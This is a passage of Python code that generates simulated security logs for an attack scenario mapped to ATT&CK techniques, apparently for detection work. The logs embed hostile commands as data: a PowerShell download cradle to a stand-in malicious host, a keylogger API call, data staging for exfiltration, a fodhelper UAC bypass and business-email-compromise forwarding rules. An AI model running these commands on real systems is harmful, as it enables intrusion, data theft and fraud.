                    "Hashes": "SHA256=DEADBEEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF12345678",
                    "ParentProcessGuid": parent_guid,
                    "ParentProcessId": str(context.parent_pid) if context.parent_pid else "",
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="collection",
            technique="T1056.001",
            host=host.short_name,
            log_data=sysmon_log,
            comment="Keylogger execution",
        )

        # PowerShell based keylogger
        self.timestamp_gen.next()
        ps_context = self._get_render_context(host, parent_guid=context.guid)
        ps_log = {
            "winlog": {
                "channel": "Microsoft-Windows-PowerShell/Operational",
                "event_id": 4104,
                "provider_name": "Microsoft-Windows-PowerShell",
                "computer_name": ps_context.hostname,
                "event_data": {
                    "MessageNumber": "1",
                    "MessageTotal": "1",
                    "ScriptBlockText": "$API = '[DllImport(\"user32.dll\")] public static extern short GetAsyncKeyState(int vKey);'; Add-Type -MemberDefinition $API -Name Keyboard -Namespace PsKeyLogger",
                    "ScriptBlockId": ps_context.guid,
                    "Path": "",
                },
            },
            "agent": {"name": ps_context.agent_name, "id": ps_context.agent_id},
        }

        self._add_log(
            phase="collection",
            technique="T1056.001",
            host=host.short_name,
            log_data=ps_log,
            comment="PowerShell keylogger API call",
        )

    def _create_local_data_collection_log(self, host: HostConfig) -> None:
        """Create local data collection/staging logs."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        # Find sensitive files
        sysmon_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Windows\\System32\\cmd.exe",
                    "CommandLine": 'cmd.exe /c dir /s /b C:\\Users\\*.docx C:\\Users\\*.xlsx C:\\Users\\*.pdf > C:\\temp\\files.txt',
                    "CurrentDirectory": "C:\\Windows\\System32\\",
                    "User": f"{context.user_domain}\\{context.username}",
                    "IntegrityLevel": "High",
                    "ParentProcessGuid": parent_guid,
                    "ParentProcessId": str(context.parent_pid) if context.parent_pid else "",
                    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="collection",
            technique="T1005",
            host=host.short_name,
            log_data=sysmon_log,
            comment="Local data discovery",
        )

        # Archive collection
        self.timestamp_gen.next()
        archive_context = self._get_render_context(host, parent_guid=context.guid)
        archive_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": archive_context.hostname,
                "event_data": {
                    "UtcTime": archive_context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": archive_context.guid,
                    "ProcessId": str(archive_context.pid),
                    "Image": "C:\\Program Files\\7-Zip\\7z.exe",
                    "CommandLine": "7z.exe a -pinfected C:\\temp\\data.7z @C:\\temp\\files.txt",
                    "CurrentDirectory": "C:\\Program Files\\7-Zip\\",
                    "User": f"{context.user_domain}\\{context.username}",
                    "IntegrityLevel": "High",
                    "ParentProcessGuid": context.guid,
                    "ParentProcessId": str(context.pid),
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                },
            },
            "agent": {"name": archive_context.agent_name, "id": archive_context.agent_id},
        }

        self._add_log(
            phase="collection",
            technique="T1560.001",
            host=host.short_name,
            log_data=archive_log,
            comment="Archive collected data with password",
        )

    def _create_network_share_collection_log(self, host: HostConfig) -> None:
        """Create network share data collection logs."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        # Net use to connect to share
        sysmon_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Windows\\System32\\net.exe",
                    "CommandLine": "net use Z: \\\\FILESERVER\\shared /user:CORP\\admin.svc P@ssw0rd123",
                    "CurrentDirectory": "C:\\Windows\\System32\\",
                    "User": f"{context.user_domain}\\{context.username}",
                    "IntegrityLevel": "High",
                    "ParentProcessGuid": parent_guid,
                    "ParentProcessId": str(context.parent_pid) if context.parent_pid else "",
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="collection",
            technique="T1039",
            host=host.short_name,
            log_data=sysmon_log,
            comment="Network share connection",
        )

        # Robocopy from share
        self.timestamp_gen.next()
        copy_context = self._get_render_context(host, parent_guid=context.guid)
        copy_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": copy_context.hostname,
                "event_data": {
                    "UtcTime": copy_context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": copy_context.guid,
                    "ProcessId": str(copy_context.pid),
                    "Image": "C:\\Windows\\System32\\robocopy.exe",
                    "CommandLine": "robocopy Z:\\confidential C:\\temp\\exfil /E /R:1 /W:1",
                    "CurrentDirectory": "C:\\Windows\\System32\\",
                    "User": f"{context.user_domain}\\{context.username}",
                    "IntegrityLevel": "High",
                    "ParentProcessGuid": context.guid,
                    "ParentProcessId": str(context.pid),
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                },
            },
            "agent": {"name": copy_context.agent_name, "id": copy_context.agent_id},
        }

        self._add_log(
            phase="collection",
            technique="T1039",
            host=host.short_name,
            log_data=copy_log,
            comment="Network share data collection via robocopy",
        )

    # ============================================================
    # Privilege Escalation Techniques
    # ============================================================

    def _create_dll_hijack_log(self, host: HostConfig) -> None:
        """Create DLL hijacking logs."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        # Malicious DLL drop
        file_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 11,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Windows\\System32\\cmd.exe",
                    "TargetFilename": "C:\\Windows\\System32\\version.dll",
                    "CreationUtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "User": f"{context.user_domain}\\{context.username}",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="privilege-escalation",
            technique="T1574.001",
            host=host.short_name,
            log_data=file_log,
            comment="DLL hijack - malicious DLL dropped",
        )

        # DLL load event
        self.timestamp_gen.next()
        load_context = self._get_render_context(host, parent_guid=context.guid)
        load_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 7,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": load_context.hostname,
                "event_data": {
                    "UtcTime": load_context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": load_context.guid,
                    "ProcessId": str(load_context.pid),
                    "Image": "C:\\Windows\\System32\\svchost.exe",
                    "ImageLoaded": "C:\\Windows\\System32\\version.dll",
                    "FileVersion": "6.1.7600.16385",
                    "Description": "Malicious DLL",
                    "Product": "Microsoft Windows Operating System",
                    "Company": "",
                    "OriginalFileName": "version.dll",
                    "Hashes": "SHA256=MALICIOUS1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234",
                    "Signed": "false",
                    "SignatureStatus": "Unsigned",
                    "User": "NT AUTHORITY\\SYSTEM",
                },
            },
            "agent": {"name": load_context.agent_name, "id": load_context.agent_id},
        }

        self._add_log(
            phase="privilege-escalation",
            technique="T1574.001",
            host=host.short_name,
            log_data=load_log,
            comment="DLL hijack - malicious DLL loaded",
        )

    def _create_named_pipe_impersonation_log(self, host: HostConfig) -> None:
        """Create named pipe impersonation logs (token manipulation)."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        # Named pipe creation
        pipe_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 17,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "RuleName": "technique_id=T1134,technique_name=Token Impersonation",
                    "EventType": "CreatePipe",
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "PipeName": "\\\\?\\pipe\\spoolss_exploit",
                    "Image": "C:\\Users\\Public\\priv_esc.exe",
                    "User": f"{context.user_domain}\\{context.username}",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="privilege-escalation",
            technique="T1134.001",
            host=host.short_name,
            log_data=pipe_log,
            comment="Named pipe created for impersonation",
        )

        # Process spawn with SYSTEM privileges
        self.timestamp_gen.next()
        system_context = self._get_render_context(host, parent_guid=context.guid)
        system_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": system_context.hostname,
                "event_data": {
                    "UtcTime": system_context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": system_context.guid,
                    "ProcessId": str(system_context.pid),
                    "Image": "C:\\Windows\\System32\\cmd.exe",
                    "CommandLine": "cmd.exe /c whoami",
                    "CurrentDirectory": "C:\\Windows\\System32\\",
                    "User": "NT AUTHORITY\\SYSTEM",
                    "IntegrityLevel": "System",
                    "ParentProcessGuid": context.guid,
                    "ParentProcessId": str(context.pid),
                    "ParentImage": "C:\\Users\\Public\\priv_esc.exe",
                },
            },
            "agent": {"name": system_context.agent_name, "id": system_context.agent_id},
        }

        self._add_log(
            phase="privilege-escalation",
            technique="T1134.001",
            host=host.short_name,
            log_data=system_log,
            comment="SYSTEM shell via token impersonation",
        )

    def _create_uac_bypass_log(self, host: HostConfig) -> None:
        """Create UAC bypass logs."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        # Fodhelper UAC bypass
        sysmon_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Windows\\System32\\fodhelper.exe",
                    "CommandLine": "fodhelper.exe",
                    "CurrentDirectory": "C:\\Windows\\System32\\",
                    "User": f"{context.user_domain}\\{context.username}",
                    "IntegrityLevel": "High",
                    "ParentProcessGuid": parent_guid,
                    "ParentProcessId": str(context.parent_pid) if context.parent_pid else "",
                    "ParentImage": "C:\\Windows\\explorer.exe",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="privilege-escalation",
            technique="T1548.002",
            host=host.short_name,
            log_data=sysmon_log,
            comment="UAC bypass via fodhelper.exe",
        )

        # Registry modification for bypass
        self.timestamp_gen.next()
        reg_context = self._get_render_context(host, parent_guid=context.guid)
        reg_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 13,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": reg_context.hostname,
                "event_data": {
                    "EventType": "SetValue",
                    "UtcTime": reg_context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": parent_guid,
                    "ProcessId": str(context.parent_pid) if context.parent_pid else "",
                    "Image": "C:\\Windows\\System32\\reg.exe",
                    "TargetObject": "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\\(Default)",
                    "Details": "C:\\Windows\\System32\\cmd.exe",
                    "User": f"{context.user_domain}\\{context.username}",
                },
            },
            "agent": {"name": reg_context.agent_name, "id": reg_context.agent_id},
        }

        self._add_log(
            phase="privilege-escalation",
            technique="T1548.002",
            host=host.short_name,
            log_data=reg_log,
            comment="UAC bypass registry modification",
        )

    # ============================================================
    # Initial Access Techniques
    # ============================================================

    def _create_exploit_public_app_log(self, host: HostConfig) -> None:
        """Create exploit of public-facing application logs."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        # Web shell process spawn from IIS
        sysmon_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Windows\\System32\\cmd.exe",
                    "CommandLine": "cmd.exe /c whoami",
                    "CurrentDirectory": "C:\\inetpub\\wwwroot\\",
                    "User": "IIS APPPOOL\\DefaultAppPool",
                    "IntegrityLevel": "High",
                    "ParentProcessGuid": parent_guid,
                    "ParentProcessId": str(context.parent_pid) if context.parent_pid else "",
                    "ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
                    "ParentCommandLine": "c:\\windows\\system32\\inetsrv\\w3wp.exe -ap \"DefaultAppPool\"",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="initial-access",
            technique="T1190",
            host=host.short_name,
            log_data=sysmon_log,
            comment="Web shell execution via IIS exploit",
        )

        # Web shell file creation
        self.timestamp_gen.next()
        shell_context = self._get_render_context(host, parent_guid=context.guid)
        shell_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 11,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": shell_context.hostname,
                "event_data": {
                    "UtcTime": shell_context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": parent_guid,
                    "ProcessId": str(context.parent_pid) if context.parent_pid else "",
                    "Image": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
                    "TargetFilename": "C:\\inetpub\\wwwroot\\shell.aspx",
                    "CreationUtcTime": shell_context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "User": "IIS APPPOOL\\DefaultAppPool",
                },
            },
            "agent": {"name": shell_context.agent_name, "id": shell_context.agent_id},
        }

        self._add_log(
            phase="initial-access",
            technique="T1505.003",
            host=host.short_name,
            log_data=shell_log,
            comment="Web shell file created",
        )

    def _create_external_remote_service_log(self, host: HostConfig) -> None:
        """Create external remote service access logs (RDP, SSH from external)."""
        context = self._get_render_context(host)

        # RDP connection from external IP
        logon_log = {
            "winlog": {
                "channel": "Security",
                "event_id": 4624,
                "provider_name": "Microsoft-Windows-Security-Auditing",
                "computer_name": context.hostname,
                "event_data": {
                    "SubjectUserSid": "S-1-0-0",
                    "SubjectUserName": "-",
                    "SubjectDomainName": "-",
                    "SubjectLogonId": "0x0",
                    "TargetUserSid": f"S-1-5-21-{random.randint(1000000000,9999999999)}-{random.randint(1000000000,9999999999)}-{random.randint(1000,9999)}-1001",
                    "TargetUserName": context.username,
                    "TargetDomainName": context.user_domain,
                    "TargetLogonId": f"0x{random.randint(100000,999999):x}",
                    "LogonType": "10",  # RemoteInteractive (RDP)
                    "LogonProcessName": "User32",
                    "AuthenticationPackageName": "Negotiate",
                    "WorkstationName": "",
                    "LogonGuid": "{" + str(uuid.uuid4()).upper() + "}",
                    "TransmittedServices": "-",
                    "LmPackageName": "-",
                    "KeyLength": "0",
                    "ProcessId": "0x0",
                    "ProcessName": "-",
                    "IpAddress": "185.220.101.45",  # External attacker IP
                    "IpPort": str(random.randint(49152, 65535)),
                    "ImpersonationLevel": "%%1833",
                    "RestrictedAdminMode": "-",
                    "TargetOutboundUserName": "-",
                    "TargetOutboundDomainName": "-",
                    "VirtualAccount": "%%1843",
                    "TargetLinkedLogonId": "0x0",
                    "ElevatedToken": "%%1842",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="initial-access",
            technique="T1133",
            host=host.short_name,
            log_data=logon_log,
            comment="External RDP logon from suspicious IP",
        )

        # Process spawn after RDP login
        self.timestamp_gen.next()
        proc_context = self._get_render_context(host)
        proc_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": proc_context.hostname,
                "event_data": {
                    "UtcTime": proc_context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": proc_context.guid,
                    "ProcessId": str(proc_context.pid),
                    "Image": "C:\\Windows\\System32\\cmd.exe",
                    "CommandLine": "cmd.exe",
                    "CurrentDirectory": f"C:\\Users\\{context.username}\\",
                    "User": f"{context.user_domain}\\{context.username}",
                    "LogonId": f"0x{random.randint(100000,999999):x}",
                    "IntegrityLevel": "High",
                    "ParentProcessGuid": "{00000000-0000-0000-0000-000000000001}",
                    "ParentProcessId": "1",
                    "ParentImage": "C:\\Windows\\explorer.exe",
                },
            },
            "agent": {"name": proc_context.agent_name, "id": proc_context.agent_id},
        }

        self._add_log(
            phase="initial-access",
            technique="T1133",
            host=host.short_name,
            log_data=proc_log,
            comment="Command shell after external RDP",
        )

    def _create_spearphishing_link_log(self, host: HostConfig) -> None:
        """Create spearphishing link attack logs."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        # Browser spawning PowerShell
        sysmon_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "CommandLine": "powershell.exe -nop -w hidden -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')\"",
                    "CurrentDirectory": f"C:\\Users\\{context.username}\\",
                    "User": f"{context.user_domain}\\{context.username}",
                    "IntegrityLevel": "Medium",
                    "ParentProcessGuid": parent_guid,
                    "ParentProcessId": str(context.parent_pid) if context.parent_pid else "",
                    "ParentImage": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                    "ParentCommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="initial-access",
            technique="T1566.002",
            host=host.short_name,
            log_data=sysmon_log,
            comment="Spearphishing link - PowerShell from browser",
        )

        # DNS query for malicious domain
        self.timestamp_gen.next()
        dns_context = self._get_render_context(host, parent_guid=context.guid)
        dns_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 22,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": dns_context.hostname,
                "event_data": {
                    "UtcTime": dns_context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "QueryName": "malicious.com",
                    "QueryStatus": "0",
                    "QueryResults": "185.220.101.100",
                    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "User": f"{context.user_domain}\\{context.username}",
                },
            },
            "agent": {"name": dns_context.agent_name, "id": dns_context.agent_id},
        }

        self._add_log(
            phase="initial-access",
            technique="T1566.002",
            host=host.short_name,
            log_data=dns_log,
            comment="Spearphishing - malicious domain resolution",
        )

    # ============================================================
    # Business Email Compromise (BEC) Scenario
    # ============================================================

    def _build_bec_scenario(self) -> None:
        """Build a Business Email Compromise scenario targeting cloud email."""
        entry_host_name = self.attack_path.entry_point
        host = self.environment.get_host(entry_host_name)
        if not host:
            return

        # Phase 1: Initial Access - OAuth consent phishing or credential theft
        self._create_oauth_consent_phishing_log(host)
        self.timestamp_gen.next()

        self._create_aad_suspicious_signin_log(host)
        self.timestamp_gen.next()

        self._create_impossible_travel_log(host)
        self.timestamp_gen.next()

        # Phase 2: Persistence - Mailbox rules and app permissions
        self.timestamp_gen.next(phase_transition=("initial-access", "persistence"))
        self._create_inbox_rule_creation_log(host)
        self.timestamp_gen.next()

        self._create_mail_forwarding_rule_log(host)
        self.timestamp_gen.next()

        self._create_oauth_app_consent_log(host)
        self.timestamp_gen.next()

        # Phase 3: Discovery - Mailbox and organization reconnaissance
        self.timestamp_gen.next(phase_transition=("persistence", "discovery"))
        self._create_mailbox_search_log(host)
        self.timestamp_gen.next()

        self._create_gal_enumeration_log(host)
        self.timestamp_gen.next()

        self._create_org_role_discovery_log(host)
        self.timestamp_gen.next()

        # Phase 4: Collection - Email harvesting
        self.timestamp_gen.next(phase_transition=("discovery", "collection"))
        self._create_email_collection_log(host)
        self.timestamp_gen.next()

        self._create_attachment_download_log(host)
        self.timestamp_gen.next()

        # Phase 5: Defense Evasion - Hide tracks
        self.timestamp_gen.next(phase_transition=("collection", "defense-evasion"))
        self._create_audit_log_tampering_log(host)
        self.timestamp_gen.next()

        self._create_read_email_deletion_log(host)
        self.timestamp_gen.next()

        # Phase 6: Exfiltration/Impact - Send fraudulent emails
        self.timestamp_gen.next(phase_transition=("defense-evasion", "exfiltration"))
        self._create_impersonation_email_log(host)
        self.timestamp_gen.next()

        self._create_wire_fraud_email_log(host)

    def _create_oauth_consent_phishing_log(self, host: HostConfig) -> None:
        """Create OAuth consent phishing attack log (Azure AD)."""
        context = self._get_render_context(host)
        user = self.environment.users[0] if self.environment.users else None
        username = user.username if user else context.username
        email = user.email if user and user.email else f"{username}@{self.environment.domain}"

        log_data = {
            "azure_ad": {
                "activity_display_name": "Consent to application",
                "category": "ApplicationManagement",
                "result": "success",
                "logged_by_service": "Core Directory",
                "initiated_by": {
                    "user": {
                        "user_principal_name": email,
                        "display_name": user.display_name if user else username,
                        "ip_address": "185.220.101.45",
                    }
                },
                "target_resources": [
                    {
                        "display_name": "Microsoft Security Update",
                        "type": "Application",
                        "modified_properties": [
                            {
                                "display_name": "ConsentContext.IsAdminConsent",
                                "new_value": "False"
                            },
                            {
                                "display_name": "ConsentContext.OnBehalfOfAll",
                                "new_value": "False"
                            }
                        ]
                    }
                ],
                "additional_details": [
                    {"key": "AppId", "value": "a1b2c3d4-e5f6-7890-abcd-ef1234567890"},
                    {"key": "Permissions", "value": "Mail.Read, Mail.Send, User.Read, offline_access"}
                ]
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="initial-access",
            technique="T1566.002",
            host=host.short_name,
            log_data=log_data,
            comment="OAuth consent phishing - malicious app authorization",
        )

    def _create_aad_suspicious_signin_log(self, host: HostConfig) -> None:
        """Create suspicious Azure AD sign-in log."""
        context = self._get_render_context(host)
        user = self.environment.users[0] if self.environment.users else None
        username = user.username if user else context.username
        email = user.email if user and user.email else f"{username}@{self.environment.domain}"

        log_data = {
            "azure_ad_signin": {
                "user_principal_name": email,
                "user_display_name": user.display_name if user else username,
                "app_display_name": "Microsoft Office",
                "ip_address": "185.220.101.45",
                "location": {
                    "city": "Moscow",
                    "state": "Moscow",
                    "country_or_region": "RU",
                },
                "status": {
                    "error_code": 0,
                    "additional_details": "MFA requirement satisfied"
                },
                "device_detail": {
                    "browser": "Chrome 120.0.0",
                    "operating_system": "Windows 10"
                },
                "risk_detail": "none",
                "risk_level_aggregated": "medium",
                "risk_level_during_signin": "medium",
                "risk_state": "atRisk",
                "client_app_used": "Browser",
                "conditional_access_status": "success",
                "correlation_id": context.guid,
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="initial-access",
            technique="T1078.004",
            host=host.short_name,
            log_data=log_data,
            comment="Suspicious Azure AD sign-in from foreign IP",
        )

    def _create_impossible_travel_log(self, host: HostConfig) -> None:
        """Create impossible travel detection log."""
        context = self._get_render_context(host)
        user = self.environment.users[0] if self.environment.users else None
        username = user.username if user else context.username
        email = user.email if user and user.email else f"{username}@{self.environment.domain}"

        log_data = {
            "azure_ad_signin": {
                "user_principal_name": email,
                "user_display_name": user.display_name if user else username,
                "app_display_name": "Microsoft Office 365",
                "ip_address": "203.0.113.50",
                "location": {
                    "city": "Beijing",
                    "state": "Beijing",
                    "country_or_region": "CN",
                },
                "status": {
                    "error_code": 0,
                },
                "risk_detail": "impossibleTravel",
                "risk_level_aggregated": "high",
                "risk_level_during_signin": "high",
                "risk_state": "atRisk",
                "risk_event_types": ["impossibleTravel"],
                "correlation_id": context.guid,
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="initial-access",
            technique="T1078.004",
            host=host.short_name,
            log_data=log_data,
            comment="Impossible travel - sign-in from different continent",
        )

    def _create_inbox_rule_creation_log(self, host: HostConfig) -> None:
        """Create inbox rule creation log (common BEC persistence)."""
        context = self._get_render_context(host)
        user = self.environment.users[0] if self.environment.users else None
        username = user.username if user else context.username
        email = user.email if user and user.email else f"{username}@{self.environment.domain}"

        log_data = {
            "office365": {
                "operation": "New-InboxRule",
                "workload": "Exchange",
                "result_status": "Succeeded",
                "user_id": email,
                "client_ip": "185.220.101.45",
                "parameters": [
                    {"Name": "Name", "Value": "Security Update"},
                    {"Name": "SubjectContainsWords", "Value": "payment;wire;transfer;invoice"},
                    {"Name": "MoveToFolder", "Value": "RSS Subscriptions"},
                    {"Name": "MarkAsRead", "Value": "True"}
                ],
                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="persistence",
            technique="T1137.005",
            host=host.short_name,
            log_data=log_data,
            comment="Inbox rule created to hide financial emails",
        )

    def _create_mail_forwarding_rule_log(self, host: HostConfig) -> None:
        """Create mail forwarding rule log."""
        context = self._get_render_context(host)
        user = self.environment.users[0] if self.environment.users else None
        username = user.username if user else context.username
        email = user.email if user and user.email else f"{username}@{self.environment.domain}"

        bec_config = self.engagement.bec
        forward_addr = bec_config.forwarding_address if bec_config else "attacker@external.com"

        log_data = {
            "office365": {
                "operation": "Set-Mailbox",
                "workload": "Exchange",
                "result_status": "Succeeded",
                "user_id": email,
                "client_ip": "185.220.101.45",
                "parameters": [
                    {"Name": "Identity", "Value": email},
                    {"Name": "ForwardingSmtpAddress", "Value": f"smtp:{forward_addr}"},
                    {"Name": "DeliverToMailboxAndForward", "Value": "True"}
                ],
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="persistence",
            technique="T1114.003",
            host=host.short_name,
            log_data=log_data,
            comment="Email forwarding configured to external address",
        )

    def _create_oauth_app_consent_log(self, host: HostConfig) -> None:
        """Create OAuth app permission grant log."""
        context = self._get_render_context(host)
        user = self.environment.users[0] if self.environment.users else None
        username = user.username if user else context.username
        email = user.email if user and user.email else f"{username}@{self.environment.domain}"

        log_data = {
            "azure_ad": {
                "activity_display_name": "Add delegated permission grant",
                "category": "ApplicationManagement",
                "result": "success",
                "initiated_by": {
                    "user": {
                        "user_principal_name": email,
                        "ip_address": "185.220.101.45",
                    }
                },
                "target_resources": [
                    {
                        "display_name": "Microsoft Graph",
                        "type": "ServicePrincipal",
                        "modified_properties": [
                            {"display_name": "DelegatedPermissionGrant.Scope", "new_value": "Mail.ReadWrite Mail.Send User.Read Directory.Read.All"}
                        ]
                    }
                ],
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="persistence",
            technique="T1098.003",
            host=host.short_name,
            log_data=log_data,
            comment="OAuth app granted mail read/write permissions",
        )

    def _create_mailbox_search_log(self, host: HostConfig) -> None:
        """Create mailbox search/discovery log."""
        context = self._get_render_context(host)
        user = self.environment.users[0] if self.environment.users else None
        username = user.username if user else context.username
        email = user.email if user and user.email else f"{username}@{self.environment.domain}"

        bec_config = self.engagement.bec
        keywords = bec_config.search_keywords if bec_config else ["wire transfer", "payment", "invoice"]

        log_data = {
            "office365": {
                "operation": "SearchCreated",
                "workload": "SecurityComplianceCenter",
                "result_status": "Succeeded",
                "user_id": email,
                "client_ip": "185.220.101.45",
                "extended_properties": [
                    {"Name": "SearchName", "Value": "Financial Review"},
                    {"Name": "Query", "Value": f"({' OR '.join(keywords)})"},
                    {"Name": "ContentMatchQuery", "Value": f"subject:{keywords[0]} OR body:{keywords[1]}"}
                ],
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="discovery",
            technique="T1087.003",
            host=host.short_name,
            log_data=log_data,
            comment="Mailbox content search for financial keywords",
        )

    def _create_gal_enumeration_log(self, host: HostConfig) -> None:
        """Create Global Address List enumeration log."""
        context = self._get_render_context(host)
        user = self.environment.users[0] if self.environment.users else None
        username = user.username if user else context.username
